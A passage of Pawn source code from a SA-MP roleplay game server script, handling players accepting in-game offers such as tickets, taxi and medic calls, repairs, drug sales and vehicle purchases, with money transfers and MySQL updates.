							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 5000);
							GivePlayerCash(TicketOffer[playerid], 5000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
						if(ticketgivened[TicketOffer[playerid]] == 7)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 20000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $20.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $20.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 20000);
							GivePlayerCash(TicketOffer[playerid], 20000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
						if(ticketgivened[TicketOffer[playerid]] == 8)
					    {
		     				GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(GetPlayerCash(playerid) < 6000) return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money.");
							format(string, sizeof(string), "{B8FFDB}* You have paid the Ticket of $6.000 to Officer %s.", giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has paid your Ticket of $6.000.", sendername);
							SendClientMessage(TicketOffer[playerid], COLOR_SERVER, string);
							PlayerInfo[TicketOffer[playerid]][pTickets] += 1;
							Update(TicketOffer[playerid],pTicketsx);
							GivePlayerCash(playerid, - 6000);
							GivePlayerCash(TicketOffer[playerid], 6000);
							Update(playerid, pCashx);
							Update(TicketOffer[playerid], pCashx);
							ticketgivened[TicketOffer[playerid]] = 0;
							TicketOffer[playerid] = 999;
							ticketmuie[playerid] = -1;
						}
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}The officer is not near you.");
			    }
			    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offered you a ticket.");
		}
		else if(strcmp(x_job,"taxi",true) == 0)
		{
            if(PlayerInfo[playerid][pMember] != 13) return SCM(playerid,COLOR_SERVER,"{FFB870}You're not a taxi driver.");
			if(TransportDuty[playerid] != 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a taxi driver on duty.");
	        if(TaxiCallTime[playerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You have already accepted a taxi call.");
	        if(!ccar && IsAnTaxi(tmpcar)) return SCM(playerid,COLOR_SERVER,"{FFB870}You're not in taxi car.");
	        if(TaxiCall[id] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not called taxi.");
	        if(TaxiCall[id] == id)
	        {
				if(IsPlayerConnected(TaxiCall[id]))
	            {
	                GetPlayerName(playerid, sendername, sizeof(sendername));
	                GetPlayerName(TaxiCall[id], giveplayer, sizeof(giveplayer));
	                format(string, sizeof(string), "{B8FFDB}* You have accepted the Taxi Call from %s, you will see the marker untill you have reached it.",giveplayer);
					SendClientMessage(playerid, COLOR_SERVER, string);
                    format(string, sizeof(string), "{B8FFDB}* Taxi Driver %s has accepted your Taxi Call please wait at your current Position.",sendername);
					SendClientMessage(TaxiCall[id], COLOR_SERVER, string);
					format(string, sizeof(string), "{FFFF00}* Taxi Driver %s has accepted %s Taxi Call.",sendername,giveplayer);
					SendFamilyMessage(13, COLOR_SERVER, string);
					TaxiCallTime[playerid] = 1;
					TaxiAccepted[playerid] = TaxiCall[id];
					TaxiCall[id] = -1;
					return 1;
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	        }
	        else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one called for a taxi yet.");
		}
		else if(strcmp(x_job,"medic",true) == 0)
		{
			if(PlayerInfo[playerid][pMember] == 14)
			{
				if(MedicCallTime[playerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You have already accepted a medic call.");
				if(!ccar && IsAnAmbulance(tmpcar)) return SCM(playerid,COLOR_SERVER,"{FFB870}You're not in ambulance car.");
				if(OnDutymedic[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Paramedic on duty.");
                if(MedicCall[id] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not called ambulance.");
			    if(MedicCall[id] == id)
		        {
					if(IsPlayerConnected(MedicCall[id]))
		            {
		                GetPlayerName(playerid, sendername, sizeof(sendername));
		                GetPlayerName(MedicCall[id], giveplayer, sizeof(giveplayer));
		                format(string, sizeof(string), "{B8FFDB}* You have accepted the Medic Call from %s, you have 5 minutes to get there.",giveplayer);
						SendClientMessage(playerid, COLOR_SERVER, string);
						SendClientMessage(playerid, COLOR_SERVER, "{B8FFDB}* After the 5 minutes the Red Marker will dissapear.");
	                    format(string, sizeof(string), "{B8FFDB}* Medic %s has accepted your Medic Call please wait at your current Position.",sendername);
						SendClientMessage(MedicCall[id], COLOR_SERVER, string);
						new Float:X,Float:Y,Float:Z;
						GetPlayerPos(MedicCall[id], X, Y, Z);
						SetPlayerCheckpoint(playerid, X, Y, Z, 5);
						MedicCallTime[playerid] = 1;
						MedicCall[id] = -1;
						return 1;
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		        }
		        else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one called for a medic yet.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Paramedic.");
		}
		else if(strcmp(x_job,"mechanic",true) == 0)
		{
			if(PlayerInfo[playerid][pJob] != 8) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a car mechanic.");
	        if(MechanicCallTime[playerid] == 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You have already accepted a Mechanic Call.");
	        if(JobDuty[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a mechanic on duty.");
			if(MechanicCall[id] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not called a mechanic.");
			if(MechanicCall[id] == id)
	        {
			    if(IsPlayerConnected(MechanicCall[id]))
	            {
	                GetPlayerName(playerid, sendername, sizeof(sendername));
                	GetPlayerName(MechanicCall[id], giveplayer, sizeof(giveplayer));
                	format(string, sizeof(string), "{B8FFDB}* You have accepted the Mechanic Call from %s, you have 5 minutes to get there.",giveplayer);
					SendClientMessage(playerid, COLOR_SERVER, string);
					SendClientMessage(playerid, COLOR_SERVER, "{B8FFDB}* After the 5 minutes the Red Marker will dissapear.");
     				format(string, sizeof(string), "{B8FFDB}* Car Mechanic %s has accepted your Mechanic Call please wait at your current Position.",sendername);
					SendClientMessage(MechanicCall[id], COLOR_SERVER, string);
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(MechanicCall[id], X, Y, Z);
					SetPlayerCheckpoint(playerid, X, Y, Z, 5);
					MechanicCallTime[playerid] = 1;
					MechanicCall[id] = -1;
					return 1;
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	        }
	        else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one called for a car Mechanic yet.");
		}
		else if(strcmp(x_job,"refill",true) == 0)
		{
			if(RefillOffer[playerid] < 999)
			{
				if(RefillOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you refill.");
				if(IsPlayerConnected(RefillOffer[playerid]))
			    {
			        if(GetPlayerCash(playerid) > RefillPrice[playerid])
			        {
						GetPlayerName(playerid, sendername, sizeof(sendername));
						GetPlayerName(RefillOffer[playerid], giveplayer, sizeof(giveplayer));
			            new car = gLastCar[playerid];
      					format(string, sizeof(string), "{B8FFDB}* You refilled your car for $%d by Car Mechanic %s.",RefillPrice[playerid],giveplayer);
						SendClientMessage(playerid,COLOR_SERVER, string);
						format(string, sizeof(string), "{B8FFDB}* You refilled %s's car and you received $%d.",sendername,RefillPrice[playerid]);
						SendClientMessage(RefillOffer[playerid], COLOR_SERVER, string);
						GivePlayerCash(RefillOffer[playerid],RefillPrice[playerid]);
						GivePlayerCash(playerid, -RefillPrice[playerid]);
						if(Gas[car] < 110) { Gas[car] = 100; }
			 	 		new str[256];
						mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d' WHERE `name`='%s'",GetPlayerCash(RefillOffer[playerid]),PlayerInfo[RefillOffer[playerid]][pNormalName]);
						mysql_tquery(SQL,str,"","");
						Update(playerid, pCashx);
					    RefillOffer[playerid] = 999;
						RefillPrice[playerid] = 0;
						return 1;
			        }
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cant afford the refill.");
			    }
			    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offered to refill your car.");
		}
		else if(strcmp(x_job,"live",true) == 0)
		{
			if(LiveOffer[playerid] < 999)
			{
				if(LiveOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"This player has not offered you live.");
			    if(IsPlayerConnected(LiveOffer[playerid]))
			    {
				    if (ProxDetectorS(5.0, playerid, LiveOffer[playerid]))
					{
						new strs[128],namee[30],string2[500],nameee[75];
						GetPlayerName(playerid, namee, sizeof(namee));
						GetPlayerName(LiveOffer[playerid], nameee, sizeof(nameee));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now in a live interview! Respect the rules or you will get kicked!");
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Everything you say will be seen by everyone on the server!");
						SendClientMessage(playerid, COLOR_ERROR, "Did you get freeze. You will be able to move after the live ends.");
						format(strs,sizeof(strs),"%s accepted live interview.", namee);
						SendClientMessage(LiveOffer[playerid], COLOR_LIGHTBLUE, strs);
						SendClientMessage(LiveOffer[playerid], COLOR_ERROR, "Did you get freeze. You will be able to move after you finish the live site.");
						TogglePlayerControllable(playerid, 0);
						TogglePlayerControllable(LiveOffer[playerid], 0);
						PlayerInfo[LiveOffer[playerid]][pLives] += 1;
						Update(LiveOffer[playerid],pLivesx);
						format(string2,500,"{33CCCC}%s has started a new live with %S.",nameee,namee);
						SendFamilyMessage(9,COLOR_YELLOW,string2);
						TalkingLive[playerid] = 1;
						TalkingLive[LiveOffer[playerid]] = 1;
						LiveOffer[playerid] = 999;
						return 1;
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "You are to far away from the News Reporter.");
				}
                else return SendClientMessage(playerid, COLOR_SERVER, "Error: Player not connected.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "No-one gave you a live conversation offer.");
		}
		else if(strcmp(x_job,"drugs",true) == 0)
		{
			if(DrugOffer[playerid] < 999)
			{
				if(DrugOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you drugs.");
				if(GetPlayerCash(playerid) > DrugPrice[playerid])
				{
				    if(PlayerInfo[playerid][pDrugs] <= 50)
				    {
					    if(IsPlayerConnected(DrugOffer[playerid]))
					    {
					        GetPlayerName(DrugOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "{B8FFDB}* You bought %d gram for $%d from Drug Dealer %s.",DrugGram[playerid],DrugPrice[playerid],giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* %s has bought your %d gram, the $%d was added to your PayCheck.",sendername,DrugGram[playerid],DrugPrice[playerid]);
							SendClientMessage(DrugOffer[playerid], COLOR_SERVER, string);
							GivePlayerCash(DrugOffer[playerid],DrugPrice[playerid]);
							GivePlayerCash(playerid, -DrugPrice[playerid]);
							PlayerInfo[playerid][pDrugs] += DrugGram[playerid];
							PlayerInfo[DrugOffer[playerid]][pDrugs] -= DrugGram[playerid];
							new str[456];
							mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`Drugs`='%d' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pNormalName]);
							mysql_tquery(SQL,str,"","");
							mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`Drugs`='%d' WHERE `name`='%s'",GetPlayerCash(DrugOffer[playerid]),PlayerInfo[DrugOffer[playerid]][pDrugs],PlayerInfo[DrugOffer[playerid]][pNormalName]);
							mysql_tquery(SQL,str,"","");
						    DrugOffer[playerid] = 999;
							DrugPrice[playerid] = 0;
							DrugGram[playerid] = 0;
							return 1;
						}
						else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are fully loaded with drugs, use them first.");
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can't afford those drugs.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offerd you any drugs.");
		}
		else if(strcmp(x_job,"repair",true) == 0)
		{
			if(RepairOffer[playerid] < 999)
			{
				if(RepairOffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you repair.");
			    if(GetPlayerCash(playerid) > RepairPrice[playerid])
				{
					if(IsPlayerInAnyVehicle(playerid))
					{
					    if(IsPlayerConnected(RepairOffer[playerid]))
					    {
						    GetPlayerName(RepairOffer[playerid], giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
       						RepairCar[playerid] = GetPlayerVehicleID(playerid);
						    SetVehicleHealth(RepairCar[playerid], 1000.0);
						    RepairVehicle(RepairCar[playerid]);
							format(string, sizeof(string), "{B8FFDB}* You repaired your car for $%d by Car Mechanic %s.",RepairPrice[playerid],giveplayer);
							SendClientMessage(playerid, COLOR_SERVER, string);
							format(string, sizeof(string), "{B8FFDB}* You fixed %s's car, the $%d has been added to your PayCheck.",sendername,RepairPrice[playerid]);
							SendClientMessage(RepairOffer[playerid], COLOR_SERVER, string);
							GivePlayerCash(RepairOffer[playerid],RepairPrice[playerid]);
							GivePlayerCash(playerid, -RepairPrice[playerid]);
							Update(playerid, pCashx);
							Update(RepairOffer[playerid],pCashx);
							RepairOffer[playerid] = 999;
							RepairPrice[playerid] = 0;
							return 1;
						}
						else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
					}
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can't afford the repair.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}No-one offerd you to repair your car.");
		}
		else if(strcmp(x_job,"hidden",true) == 0)
		{
		    if(IsPlayerConnected(hiddenoffer[playerid]))
		    {
		        if(hiddenoffer[playerid] != id) return SCM(playerid,COLOR_SERVER,"This player has not offered you a hidden color.");
		        if(PlayerInfo[hiddenoffer[playerid]][pPremiumPoints] <= 9) return SCM(playerid,COLOR_SERVER,"That player don't have 10 premium points.");
		        if(GetPlayerCash(playerid) >= hiddenprice[playerid])
		        {
		            new string23[128],sendername2[30],giveplayer2[30];
		            GetPlayerName(playerid, sendername2, sizeof(sendername2));
		            GetPlayerName(hiddenoffer[playerid], giveplayer2, sizeof(giveplayer2));
		            PlayerInfo[hiddenoffer[playerid]][pHiddenColor] -= 1;
		            PlayerInfo[playerid][pHiddenColor] += 1;
		            Update(hiddenoffer[playerid], pHiddenColorx);
		            Update(playerid, pHiddenColorx);
		            GivePlayerCash(playerid, -hiddenprice[playerid]);
		            GivePlayerCash(hiddenoffer[playerid], hiddenprice[playerid]);
		            Update(playerid, pCashx);
		            Update(hiddenoffer[playerid], pCashx);
		            format(string23,sizeof(string23),"You have bought a hidden color from %s for $%s.",giveplayer2,FormatNumber(hiddenprice[playerid]));
		            SendClientMessage(playerid, COLOR_GREEN, string23);
		            format(string23,sizeof(string23),"%s bought your hidden color for $%s.",sendername2,FormatNumber(hiddenprice[playerid]));
		            SendClientMessage(hiddenoffer[playerid], COLOR_GREEN, string23);
		            hiddenoffer[playerid] = 999;
		            hiddenprice[playerid] = 0;
				}
				else return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		/*else if(strcmp(x_job,"tradecar",true) == 0)
		{
		    if(IsPlayerConnected(tradeofferer[playerid]))
		    {
		        if(tradeofferer[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you a car.");
		        if(GetPlayerCash(tradeofferer[playerid]) >= tradediff[playerid])
		        {
		            new tid = tradeofferer[playerid],string21[256],sendername21[30],giveplayer21[30];
		            GetPlayerName(tradeofferer[playerid],sendername21,sizeof(sendername21));
		            GetPlayerName(playerid,giveplayer21,sizeof(giveplayer21));
		            if(tradetype2[playerid] != PlayerInfo[playerid][pPcarkey] && tradetype2[playerid] != PlayerInfo[playerid][pmotokey] && tradetype2[playerid] != PlayerInfo[playerid][pprcarkey] && tradetype2[playerid] != PlayerInfo[playerid][pprcarkey2] && tradetype2[playerid] != PlayerInfo[playerid][pPPluscarkey] && tradetype2[playerid] != PlayerInfo[playerid][pPPluscarkey])
						return SendClientMessage(playerid, COLOR_SERVER, "Masina oferita numai este detinuta de tine.");
					if(tradetype[playerid] != PlayerInfo[tid][pPcarkey] && tradetype[playerid] != PlayerInfo[tid][pmotokey] && tradetype[playerid] != PlayerInfo[tid][pprcarkey] && tradetype[playerid] != PlayerInfo[tid][pprcarkey2] && tradetype[playerid] != PlayerInfo[tid][pPPluscarkey] && tradetype[playerid] != PlayerInfo[tid][pPPluscarkey2])
					    return SendClientMessage(playerid, COLOR_SERVER, "Acel jucator numai detine aceasta masina.");

					if(tradecars2[playerid] == personalcar[0][playerid])
					{
	    				personalcar[0][playerid] = tradecars[playerid];
					}
					if(tradecars2[playerid] == personalcar[1][playerid])
					{
	    				personalcar[1][playerid] = tradecars[playerid];
					}
					if(tradecars2[playerid] == personalcar[2][playerid])
					{
	    				personalcar[2][playerid] = tradecars[playerid];
					}
					if(tradecars2[playerid] == personalcar[3][playerid])
					{
	    				personalcar[3][playerid] = tradecars[playerid];
					}
					if(tradecars2[playerid] == personalcar[4][playerid])
					{
	    				personalcar[4][playerid] = tradecars[playerid];
					}
					if(tradecars2[playerid] == personalcar[5][playerid])
					{
	    				personalcar[5][playerid] = tradecars[playerid];
					}

					if(tradecars[playerid] == personalcar[0][tradeofferer[playerid]])
					{
	    				personalcar[0][tradeofferer[playerid]] = tradecars2[playerid];
					}
					if(tradecars[playerid] == personalcar[1][tradeofferer[playerid]])
					{
	    				personalcar[1][tradeofferer[playerid]] = tradecars2[playerid];
					}
					if(tradecars[playerid] == personalcar[2][tradeofferer[playerid]])
					{
	    				personalcar[2][tradeofferer[playerid]] = tradecars2[playerid];
					}
					if(tradecars[playerid] == personalcar[3][tradeofferer[playerid]])
					{
	    				personalcar[3][tradeofferer[playerid]] = tradecars2[playerid];
					}
					if(tradecars[playerid] == personalcar[4][tradeofferer[playerid]])
					{
	    				personalcar[4][tradeofferer[playerid]] = tradecars2[playerid];
					}
					if(tradecars[playerid] == personalcar[5][tradeofferer[playerid]])
					{
	    				personalcar[5][tradeofferer[playerid]] = tradecars2[playerid];
					}

					if(tradetype2[playerid] == PlayerInfo[playerid][pPcarkey])
					{
					    PlayerInfo[playerid][pPcarkey] = tradetype[playerid];
					    Update(playerid,pPcarkeyx);
					}
					if(tradetype2[playerid] == PlayerInfo[playerid][pmotokey])
					{
					    PlayerInfo[playerid][pmotokey] = tradetype[playerid];
					    Update(playerid,pmotokeyx);
					}
					if(tradetype2[playerid] == PlayerInfo[playerid][pprcarkey])
					{
					    PlayerInfo[playerid][pprcarkey] = tradetype[playerid];
					    Update(playerid,pprcarkeyx);
					}
					if(tradetype2[playerid] == PlayerInfo[playerid][pprcarkey])
					{
					    PlayerInfo[playerid][pprcarkey] = tradetype[playerid];
					    Update(playerid,pprcarkey2x);
					}
					if(tradetype2[playerid] == PlayerInfo[playerid][pPPluscarkey])
					{
					    PlayerInfo[playerid][pPPluscarkey] = tradetype[playerid];
					    Update(playerid,pPPluscarkeyx);
					}
					if(tradetype2[playerid] == PlayerInfo[playerid][pPPluscarkey2])
					{
					    PlayerInfo[playerid][pPPluscarkey2] = tradetype[playerid];
					    Update(playerid,pPPluscarkey2x);
					}

					if(tradetype[playerid] == PlayerInfo[tradeofferer[playerid]][pPcarkey])
					{
					    PlayerInfo[tradeofferer[playerid]][pPcarkey] = tradetype2[playerid];
					    Update(tradeofferer[playerid],pPcarkeyx);
					}
					if(tradetype[playerid] == PlayerInfo[tradeofferer[playerid]][pmotokey])
					{
					    PlayerInfo[tradeofferer[playerid]][pmotokey] = tradetype2[playerid];
					    Update(tradeofferer[playerid],pmotokeyx);
					}
					if(tradetype[playerid] == PlayerInfo[tradeofferer[playerid]][pprcarkey])
					{
					    PlayerInfo[tradeofferer[playerid]][pprcarkey] = tradetype2[playerid];
					    Update(tradeofferer[playerid],pprcarkeyx);
					}
					if(tradetype[playerid] == PlayerInfo[tradeofferer[playerid]][pprcarkey2])
					{
					    PlayerInfo[tradeofferer[playerid]][pprcarkey2] = tradetype2[playerid];
					    Update(tradeofferer[playerid],pprcarkey2x);
					}
					if(tradetype[playerid] == PlayerInfo[tradeofferer[playerid]][pPPluscarkey])
					{
					    PlayerInfo[tradeofferer[playerid]][pPPluscarkey] = tradetype2[playerid];
					    Update(tradeofferer[playerid],pPPluscarkeyx);
					}
					if(tradetype[playerid] == PlayerInfo[tradeofferer[playerid]][pPPluscarkey2])
					{
					    PlayerInfo[tradeofferer[playerid]][pPPluscarkey2] = tradetype2[playerid];
					    Update(tradeofferer[playerid],pPPluscarkey2x);
					}
					GivePlayerCash(tradeofferer[playerid], - tradediff[playerid]);
					GivePlayerCash(playerid, tradediff[playerid]);
					Update(tradeofferer[playerid], pCashx);
					Update(playerid, pCashx);
					strmid(CarInfo[tradetype[playerid]][cOwner], PlayerInfo[playerid][pNormalName], 0, 25, 999);
	    			vUpdate(tradetype[playerid],cOwnerx);
	    			strmid(CarInfo[tradetype2[playerid]][cOwner], PlayerInfo[tradeofferer[playerid]][pNormalName], 0, 25, 999);
	    			vUpdate(tradetype2[playerid],cOwnerx);
					format(string21,sizeof(string21),"Ai acceptat schimbul de masini cu %s, acum ai %s in loc de %s + diferenta $%s.",sendername21,CarInfo[tradetype[playerid]][cDescription],CarInfo[tradetype2[playerid]][cDescription],FormatNumber(tradediff[playerid]));
					SendClientMessage(playerid, COLOR_GREEN, string21);
					format(string21,sizeof(string21),"Ai acceptat schimbul de masini cu %s, acum ai %s in loc de %s - diferenta $%s.",giveplayer21,CarInfo[tradetype2[playerid]][cDescription],CarInfo[tradetype[playerid]][cDescription],FormatNumber(tradediff[playerid]));
					SendClientMessage(tradeofferer[playerid], COLOR_GREEN, string21);
					format(string21, sizeof(string21), "($) %s traded his car (%s - %d) + $%s for %s's car (%s - %d).",giveplayer21,CarInfo[tradetype[playerid]][cDescription],CarInfo[tradetype[playerid]][cID],FormatNumber(tradediff[playerid]),sendername21,CarInfo[tradetype2[playerid]][cDescription],CarInfo[tradetype2[playerid]][cID]);
					ABroadCast(COLOR_YELLOW, string21,1);
					new var100[256],y,m,d,h,mi,s,string2[256],string3[256];
					getdate(y,m,d);
					gettime(h,mi,s);
					format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s[user:%d] traded his car (%s - %d) + $%s for %s[user:%d] car (%s - %d)",d,m,y,h,mi,s,giveplayer21,PlayerInfo[playerid][pSQLID],CarInfo[tradetype[playerid]][cDescription],CarInfo[tradetype[playerid]][cID],FormatNumber(tradediff[playerid]),sendername21,PlayerInfo[tradeofferer[playerid]][pSQLID],CarInfo[tradetype2[playerid]][cDescription],CarInfo[tradetype2[playerid]][cID]);
	    			mysql_real_escape_string(string2, string3);
					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','%d','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[playerid][pSQLID],PlayerInfo[tradeofferer[playerid]][pSQLID],string3,d,m,y,h,mi,s);
					mysql_tquery(SQL,var100,"","");
					tradeofferer[playerid] = -1;
					tradediff[playerid] = 0;
					tradetype[playerid] = -1;
					tradetype2[playerid] = - 1;
					tradecars[playerid] = -1;
					tradecars2[playerid] = -1;
				}
				else return SCM(playerid,COLOR_SERVER,"{FFB870}That player don't have the difference.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}*/
  		else if(strcmp(x_job,"vehicle",true) == 0)
		{
		    if(IsPlayerConnected(ofercar[playerid]))
		    {
		        if(ofercar[playerid] != id) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has not offered you a car.");
		        if(GetPlayerCash(playerid) >= carprice[playerid])
		        {
		            new vehh = GetPlayerVehicleID(id),tipmasina,myvehh = GetPlayerVehicleID(playerid),vehiculprimit;
					if(primesccar[playerid] == 1)
					{
					    if(vehh != personalcar[0][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[0][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 1;
					}
					if(primesccar[playerid] == 2)
					{
					    if(vehh != personalcar[1][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[1][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 2;
					}
					if(primesccar[playerid] == 3)
					{
					    if(vehh != personalcar[2][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[2][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 3;
					}
					if(primesccar[playerid] == 4)
					{
					    if(vehh != personalcar[3][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[3][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 4;
					}
					if(primesccar[playerid] == 5)
					{
					    if(vehh != personalcar[4][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[4][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 5;
					}
					if(primesccar[playerid] == 6)
					{
					    if(vehh != personalcar[5][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[5][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 6;
					}
					if(primesccar[playerid] == 7)
					{
					    if(vehh != personalcar[6][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[6][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 7;
					}
					if(primesccar[playerid] == 8)
					{
					    if(vehh != personalcar[7][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[7][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 8;
					}
					if(primesccar[playerid] == 9)
					{
					    if(vehh != personalcar[8][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[8][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 9;
					}
					if(primesccar[playerid] == 10)
					{
					    if(vehh != personalcar[9][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[9][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 10;
					}
					if(primesccar[playerid] == 11)
					{
					    if(vehh != personalcar[10][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
					    if(myvehh != personalcar[10][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in the offered vehicle.");
					    tipmasina = 11;
					}
					if(primesccar[playerid] == 12)
					{
					    if(vehh != personalcar[11][ofercar[playerid]]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Vehicle seller needs to be at his selling car.");
